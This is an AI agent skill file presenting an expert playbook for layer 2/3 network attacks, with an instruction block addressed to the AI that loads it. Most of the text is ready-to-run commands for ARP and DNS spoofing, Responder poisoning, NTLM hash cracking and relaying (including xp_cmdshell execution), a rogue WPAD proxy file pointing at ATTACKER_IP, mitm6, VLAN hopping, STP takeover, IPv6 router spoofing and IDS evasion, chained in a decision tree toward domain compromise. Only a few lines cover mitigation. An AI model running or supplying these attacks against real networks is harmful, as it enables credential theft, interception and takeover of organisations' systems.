---
name: network-protocol-attacks
description: >-
  Network protocol attack playbook. Use when exploiting layer 2/3 protocols including ARP spoofing, LLMNR/NBT-NS/mDNS poisoning, WPAD abuse, DHCPv6 attacks, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion.
---

# SKILL: Network Protocol Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert network protocol attack techniques. Covers ARP spoofing, name resolution poisoning (LLMNR/NBT-NS/mDNS), WPAD abuse, DHCPv6 takeover, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion. Base models miss the chaining opportunities between these attacks and the nuances of modern switched network exploitation.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after establishing MitM position for traffic redirection
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relaying captured NTLM hashes from poisoning attacks
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered during network attacks
- [traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md) for analyzing captured traffic from MitM

### Advanced Reference

Also load [NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md) when you need:
- Detailed Responder/mitm6 configuration and workflows
- NTLM relay target selection and chaining
- Credential format analysis and cracking priorities

---

## 1. ARP SPOOFING

### Gratuitous ARP — MitM Positioning

```bash
# arpspoof (dsniff suite)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# ettercap — ARP poisoning with sniffing
ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# bettercap — modern framework
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

### Selective Targeting

```bash
# bettercap — target specific hosts, avoid detection
> set arp.spoof.targets 10.0.0.50,10.0.0.51
> set arp.spoof.fullduplex true
> set arp.spoof.internal true
> arp.spoof on
```

### Detection Indicators

- Duplicate MAC addresses in ARP table
- Gratuitous ARP storms from non-gateway IPs
- Tools: `arpwatch`, static ARP entries, 802.1X port authentication

---

## 2. LLMNR / NBT-NS / mDNS POISONING

### Responder — Credential Capture

```bash
# Basic poisoning (LLMNR + NBT-NS + mDNS)
responder -I eth0 -dwPv

# Key flags:
# -d  Enable answers for DHCP broadcast requests (fingerprinting)
# -w  Start WPAD rogue proxy
# -P  Force NTLM auth for WPAD
# -v  Verbose

# Analyze mode only (passive, no poisoning)
responder -I eth0 -A
```

### Captured Hash Formats

| Protocol | Hash Type | Hashcat Mode | Crackability |
|---|---|---|---|
| NTLMv1 | NetNTLMv1 | 5500 | Fast — rainbow tables viable |
| NTLMv2 | NetNTLMv2 | 5600 | Moderate — dictionary + rules |
| NTLMv1-ESS | NetNTLMv1 | 5500 | Fast — same as NTLMv1 |

```bash
# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

### Relay Instead of Crack

```bash
# ntlmrelayx — relay captured NTLM to other services
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD attack
ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
```

---

## 3. WPAD ABUSE

```bash
# Responder with WPAD proxy
responder -I eth0 -wPv

# WPAD flow:
# 1. Client queries DHCP for WPAD → DNS for wpad.domain.com → LLMNR/NBT-NS
# 2. Responder answers with rogue wpad.dat
# 3. Browser uses attacker's proxy → forced NTLM auth → credential capture
```

### Manual WPAD PAC File

```javascript
// Rogue wpad.dat content
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:3128; DIRECT";
}
```

---

## 4. DHCPv6 ATTACK — mitm6

Even on IPv4-only networks, Windows clients send DHCPv6 solicitations by default.

```bash
# mitm6 → DNS takeover → NTLM relay
mitm6 -d domain.com

# In parallel: relay captured NTLM to LDAP(S) for delegation
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access

# Attack chain:
# 1. mitm6 answers DHCPv6 → sets attacker as IPv6 DNS
# 2. Victim DNS queries go to attacker → WPAD redirect
# 3. Forced NTLM auth → relay to LDAP → create machine account or RBCD
```

### Key Conditions

- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced on DC (for LDAP relay)
- Domain Computers quota > 0 (for machine account creation, default: 10)

---

## 5. VLAN HOPPING

### Switch Spoofing (DTP)

```bash
# yersinia — DTP attack to negotiate trunk
yersinia dtp -attack 1 -interface eth0

# frogger.sh — automated VLAN hopping via DTP
./frogger.sh
# Sends DTP frames → switch enables trunking → access all VLANs

# After trunk established:
modprobe 8021q
vconfig add eth0 TARGET_VLAN
ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up
```

### Double Tagging (802.1Q)

```bash
# Craft double-tagged frame: outer=native VLAN, inner=target VLAN
# scapy:
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")

# Limitation: one-way only (responses go to real gateway)
# Effective for blind attacks (e.g., targeting a server)
```

### Mitigation

- Disable DTP: `switchport nonegotiate`
- Set native VLAN to unused: `switchport trunk native vlan 999`
- Prune VLANs: only allow needed VLANs on trunk ports

---

## 6. STP MANIPULATION

### Root Bridge Claim

```bash
# yersinia — claim root bridge with lowest priority
yersinia stp -attack 4 -interface eth0

# Send BPDUs with priority 0 → become root bridge
# All traffic flows through attacker → MitM
```

### Topology Change Attack

```bash
# Send TC (Topology Change) BPDUs → force MAC table flush
yersinia stp -attack 1 -interface eth0
# Switches flood all ports temporarily → sniff traffic
```

### Mitigation

- BPDU Guard on access ports
- Root Guard on designated ports
- `spanning-tree portfast bpduguard enable`

---

## 7. DNS SPOOFING

### DNS Cache Poisoning

```bash
# bettercap DNS spoofing
bettercap -iface eth0
> set dns.spoof.domains target.com, *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ettercap DNS spoofing (via etter.dns config)
echo "target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /VICTIM// /GATEWAY//
```

### Kaminsky Attack Variant

Flood recursive resolver with forged responses for random subdomains, each including a malicious authority section pointing the NS record to attacker-controlled server.

---

## 8. IPv6 ATTACKS

### Router Advertisement Spoofing

```bash
# Send rogue RA → victim configures attacker as default gateway
atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64

# THC-IPv6 suite for comprehensive IPv6 attacks
atk6-parasite6 eth0     # ICMPv6 neighbor spoofing
atk6-redir6 eth0 ...    # Traffic redirection via ICMPv6 redirect
```

### SLAAC Abuse

```bash
# Advertise rogue prefix → victim auto-configures IPv6 address
# Combined with rogue DNS (RA option) → full MitM over IPv6
# Windows prioritizes IPv6 over IPv4 by default
```

---

## 9. IDS/IPS EVASION

| Technique | Method | Tool/Flag |
|---|---|---|
| IP Fragmentation | Split payload across fragments | `nmap -f`, `fragroute` |
| TTL Manipulation | Set TTL to expire at IDS but reach target | `fragroute` |
| Encoding Evasion | URL/Unicode/hex encoding | Manual, custom scripts |
| Session Splicing | Split TCP payload across segments | `fragroute`, `nmap --data-length` |
| Timing-Based | Slow scan to avoid rate-based detection | `nmap -T0`, `nmap -T1` |
| Decoy Scanning | Mix real scan with decoy source IPs | `nmap -D RND:10` |
| Idle/Zombie Scan | Use idle host as scan proxy | `nmap -sI ZOMBIE_IP` |

```bash
# fragroute — fragment and reorder packets
echo "ip_frag 8" > /tmp/frag.conf
echo "order random" >> /tmp/frag.conf
fragroute -f /tmp/frag.conf TARGET_IP

# nmap evasion combinations
nmap -sS -f --mtu 24 --data-length 50 -D RND:5 -T2 TARGET
```

---

## 10. DECISION TREE

```
Network access obtained — want to escalate via network attacks
│
├── On same broadcast domain as targets?
│   ├── YES → ARP spoof for MitM (§1)
│   │   └── Capture plaintext creds or redirect traffic
│   └── NO → need VLAN hopping first (§5)
│       ├── DTP enabled? → switch spoofing
│       └── Know native VLAN? → double tagging
│
├── Windows environment?
│   ├── LLMNR/NBT-NS enabled? (default YES)
│   │   └── Run Responder (§2) → capture NetNTLM hashes
│   │       ├── NTLMv1? → crack fast or relay
│   │       └── NTLMv2? → relay (§2) or crack with rules
│   │
│   ├── WPAD configured or auto-detect? → WPAD abuse (§3)
│   │
│   └── IPv6 not hardened? (default) → mitm6 + ntlmrelayx (§4)
│       └── LDAP relay → RBCD → domain compromise
│
├── Need DNS control?
│   ├── MitM already established? → DNS spoofing (§7)
│   └── DHCPv6 available? → mitm6 for DNS takeover (§4)
│
├── Managed switches with weak config?
│   ├── BPDU Guard off? → STP root bridge claim (§6)
│   └── DTP enabled? → VLAN hopping (§5)
│
├── IPv6 attack surface?
│   └── RA spoofing / SLAAC abuse (§8) → MitM over IPv6
│
└── IDS/IPS in path?
    └── Apply evasion techniques (§9) — fragmentation, timing, encoding
```
